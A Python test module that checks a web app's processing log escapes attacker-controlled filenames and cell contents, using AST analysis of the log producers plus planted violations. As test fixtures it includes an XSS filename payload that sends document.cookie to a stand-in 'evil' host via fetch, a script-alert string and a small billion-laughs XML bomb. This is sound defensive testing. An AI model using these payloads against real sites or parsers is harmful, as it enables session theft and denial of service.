"""Guard the processing-log XSS boundary.

``ui/shared.py::show_processing_log`` renders every log line with
``unsafe_allow_html=True`` (the producers deliberately emit coloured
``<span>``/``<b>`` markup). That makes every value interpolated into a log
line an HTML injection point, and the values are attacker-controlled:
uploaded filenames and cell contents from supplier workbooks.

This has now regressed twice — v2.75.6 fixed ``ui/giii/excel_extraction.py``
and missed the other three producers. So rather than trusting review, this
module asserts the invariant mechanically: **every f-string interpolation
inside a ``log.append(...)`` call must be wrapped in ``html.escape(...)``.**

A new producer file that forgets to escape fails ``test_all_log_producers_escape``.
"""
from __future__ import annotations

import ast
import io
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parent.parent

# Every module that appends to a `log` list rendered by show_processing_log().
PRODUCERS = [
    "ui/giii/excel_extraction.py",
    "ui/giii/extraction.py",
    "ui/sky_east/_validators.py",
    "ui/sky_east/processing.py",
]


# Trusted markup helpers (ui/log_markup).  They wrap text in a status span and
# do NOT escape it, so their arguments are held to the same rule as a bare
# interpolation: every value must be escape()d or a literal.  The ``kind``
# argument and keyword flags are literals by construction.
_MARKUP_HELPERS = {"badge", "ok", "warn", "err"}


def _is_escape_call(expr: ast.expr) -> bool:
    return (isinstance(expr, ast.Call)
            and isinstance(expr.func, ast.Attribute)
            and expr.func.attr == "escape")


def _is_safe(expr: ast.expr) -> bool:
    """True when *expr* cannot carry unescaped attacker text into the log.

    Safe: an ``html.escape(...)`` call; a string literal; an f-string whose
    every placeholder is safe; a ``badge(...)``-family call whose every
    argument is safe.  Anything else — a bare variable, an arbitrary call —
    is not, even if it happens to be harmless today.
    """
    if _is_escape_call(expr):
        return True
    if isinstance(expr, ast.Constant):
        return True
    if isinstance(expr, ast.JoinedStr):
        return all(_is_safe(v.value) for v in expr.values
                   if isinstance(v, ast.FormattedValue))
    if (isinstance(expr, ast.Call) and isinstance(expr.func, ast.Name)
            and expr.func.id in _MARKUP_HELPERS):
        return (all(_is_safe(a) for a in expr.args)
                and all(_is_safe(k.value) for k in expr.keywords))
    return False


def _unescaped_interpolations(path: Path) -> list[tuple[int, str]]:
    """Return [(lineno, expr)] for log.append values lacking escape().

    Checks every f-string placeholder inside the call, and — so a producer
    can't sidestep the rule by handing a bare variable to ``badge()`` — every
    argument of a markup-helper call passed directly to ``log.append``.
    """
    tree = ast.parse(io.open(path, encoding="utf-8").read())
    bad: list[tuple[int, str]] = []
    for node in ast.walk(tree):
        if not (isinstance(node, ast.Call)
                and isinstance(node.func, ast.Attribute)
                and node.func.attr == "append"
                and isinstance(node.func.value, ast.Name)
                and node.func.value.id == "log"):
            continue
        for arg in node.args:
            # badge(...) handed straight to log.append — check its arguments.
            if (isinstance(arg, ast.Call) and isinstance(arg.func, ast.Name)
                    and arg.func.id in _MARKUP_HELPERS):
                for a in list(arg.args) + [k.value for k in arg.keywords]:
                    if not _is_safe(a):
                        bad.append((node.lineno, ast.unparse(a)))
                continue
            for sub in ast.walk(arg):
                if isinstance(sub, ast.FormattedValue) and not _is_safe(sub.value):
                    bad.append((node.lineno, ast.unparse(sub.value)))
    return bad


@pytest.mark.parametrize("rel", PRODUCERS)
def test_all_log_producers_escape(rel):
    """No unescaped value may reach the unsafe_allow_html log renderer."""
    path = REPO / rel
    assert path.exists(), f"producer moved or renamed: {rel}"
    bad = _unescaped_interpolations(path)
    assert not bad, (
        f"{rel}: {len(bad)} unescaped interpolation(s) reach the "
        f"unsafe_allow_html processing log — wrap each in html.escape(str(...)): "
        + "; ".join(f"line {ln}: {expr}" for ln, expr in bad[:10])
    )


def test_detector_catches_a_planted_violation(tmp_path):
    """The guard above must actually fail on unescaped input (not vacuously pass)."""
    f = tmp_path / "bad_producer.py"
    f.write_text(
        "log = []\n"
        "fname = 'x'\n"
        "log.append(f'<span>{fname}</span>')\n",
        encoding="utf-8",
    )
    assert _unescaped_interpolations(f) == [(3, "fname")]

    good = tmp_path / "good_producer.py"
    good.write_text(
        "import html\n"
        "log = []\n"
        "fname = 'x'\n"
        "log.append(f'<span>{html.escape(str(fname))}</span>')\n",
        encoding="utf-8",
    )
    assert _unescaped_interpolations(good) == []


def test_badge_helper_does_not_open_a_hole(tmp_path):
    """``badge()`` doesn't escape — so a bare variable handed to it, directly
    or inside an f-string, must be flagged exactly like a bare interpolation,
    while escaped arguments pass."""
    bad = tmp_path / "bad_badge.py"
    bad.write_text(
        "from ui.log_markup import badge\n"
        "log = []\n"
        "fname = 'x'\n"
        "log.append(badge('err', fname))\n"                       # direct
        "log.append(f'{badge(\"ok\", fname)} — 3 rows')\n",       # nested
        encoding="utf-8",
    )
    assert [ln for ln, _ in _unescaped_interpolations(bad)] == [4, 5]

    good = tmp_path / "good_badge.py"
    good.write_text(
        "import html\n"
        "from ui.log_markup import badge\n"
        "log = []\n"
        "fname = 'x'\n"
        "log.append(badge('err', html.escape(str(fname))))\n"
        "log.append(f'{badge(\"ok\", html.escape(str(fname)))} — 3 rows')\n"
        "log.append(badge('warn', 'Ignored (0 units)'))\n"
        "log.append(badge('ok', f'{html.escape(str(fname))}: done', glyph=False))\n",
        encoding="utf-8",
    )
    assert _unescaped_interpolations(good) == []


def test_malicious_filename_is_neutralised_end_to_end():
    """A hostile uploaded filename must not survive as live HTML in a log line.

    Mirrors ui/sky_east/processing.py's parse-failure line — the exact shape
    that rendered raw before this fix.
    """
    import html

    fname = '<img src=x onerror="fetch(`//evil/${document.cookie}`)">.xlsx'
    exc = ValueError("<script>alert(1)</script>")

    line = (f'<span style="color:#dc3545">{html.escape(str(fname))}</span>: '
            f'{html.escape(str(exc))}')

    # The wrapper markup the producer intends survives …
    assert line.startswith('<span style="color:#dc3545">')

    # … but nothing attacker-supplied can open a tag. Strip the two trusted
    # literal fragments the producer contributes; no '<' may remain, so the
    # payload is inert text no matter what it spells (a leftover "onerror="
    # with no tag to attach to cannot execute).
    attacker_part = (line
                     .replace('<span style="color:#dc3545">', "")
                     .replace("</span>", ""))
    assert "<" not in attacker_part
    assert "&lt;img" in line and "&lt;script&gt;" in line
    # The quotes that would close an attribute are neutralised too.
    assert '"' not in attacker_part


def test_hostile_xml_is_refused_not_crashed():
    """An entity-expansion bomb in an uploaded workbook is refused, and the
    refusal is caught by the module's handler tuple rather than escaping."""
    from po_extractor.utils import image_extractor as ie

    billion_laughs = (
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">'
        '<!ENTITY lol2 "&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>'
    )
    with pytest.raises(tuple(ie._XML_ERRORS)):
        ie.ET.fromstring(billion_laughs)
